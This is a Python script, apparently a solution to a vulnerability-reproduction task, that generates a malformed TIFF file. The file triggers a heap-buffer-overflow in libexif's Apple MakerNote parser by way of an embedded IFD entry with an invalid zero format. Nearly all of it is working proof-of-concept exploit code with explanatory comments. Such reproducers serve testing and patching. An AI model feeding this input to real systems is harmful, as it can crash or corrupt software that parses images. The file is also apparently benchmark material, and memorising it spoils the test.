import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap-buffer-overflow in libexif's
        Apple MakerNote parser.

        The vulnerability exists in a fallback parsing path for Apple MakerNotes.
        If the MakerNote data starts with "Apple" but doesn't match the specific
        "Apple iOS" header, the parser attempts to interpret it as a standard
        TIFF IFD embedded within the MakerNote. This PoC exploits this path.

        The PoC creates a MakerNote entry with an invalid format (type 0). When
        the parser creates an ExifEntry for this, it allocates a 0-byte data
        buffer because the size for format 0 is 0. Later, when another
        function (`mnote_apple_entry_get_value`) tries to read the value of
        this tag, it incorrectly assumes the format is SHORT and attempts to
        read 2 bytes from the 0-byte buffer using `exif_get_short`, leading to
        a heap-buffer-overflow.

        The PoC is a minimal TIFF file containing:
        1. A main IFD with a single entry for the MakerNote tag (0x927c).
        2. The MakerNote data blob, which starts with "Apple" to trigger the
           correct parser but has a custom structure to enter the vulnerable
           fallback path.
        3. An embedded IFD within the MakerNote containing the malicious tag
           entry (tag=1, format=0, count=1).
        """
        
        poc = bytearray()

        # TIFF Header: Big Endian ('MM'), Magic Number 42, IFD0 at offset 8
        poc += struct.pack('>HHL', 0x4d4d, 0x002a, 8)

        # IFD0: Contains 1 entry
        poc += struct.pack('>H', 1)
        
        # IFD0 Entry 1: MakerNote (Tag 0x927c, Type UNDEFINED)
        # We use placeholders for Count and Offset, which will be filled in later.
        poc += struct.pack('>HHLL', 0x927c, 7, 0, 0)

        # Next IFD offset: 0 (no other IFDs)
        poc += struct.pack('>L', 0)

        makernote_offset = len(poc)

        # MakerNote Data Blob
        makernote_data = bytearray()
        
        # Header designed to trigger the Apple parser but fail the "Apple iOS"
        # specific check, causing it to use the vulnerable fallback parser.
        # This fallback parser expects an 8-byte header followed by an offset.
        makernote_data += b'Apple\0\0\0'

        # 4-byte offset to the embedded IFD, relative to the start of the
        # MakerNote data. The IFD will start right after this offset field (8+4=12).
        makernote_data += struct.pack('>L', 12)

        # Embedded IFD within the MakerNote: Contains 1 entry
        makernote_data += struct.pack('>H', 1)

        # The malicious entry that causes the crash.
        # Tag ID: 0x0001 (an arbitrary value not handled as a special case)
        # Format: 0 (invalid, leads to 0-size allocation)
        # Component Count: 1 (non-zero to ensure the read loop is entered)
        # Value/Offset: 0
        tag_id = 0x0001
        tag_format = 0
        tag_components = 1
        tag_value_offset = 0
        makernote_data += struct.pack('>HHLL', tag_id, tag_format, tag_components, tag_value_offset)

        # Next embedded IFD offset: 0
        makernote_data += struct.pack('>L', 0)

        makernote_size = len(makernote_data)
        
        # Append the constructed MakerNote data to the PoC buffer.
        poc += makernote_data

        # Fill in the placeholders in the IFD0 MakerNote entry.
        # The entry starts at offset 10. The count and offset fields are
        # 4 bytes into the entry, so at file offset 14.
        struct.pack_into('>LL', poc, 14, makernote_size, makernote_offset)

        return bytes(poc)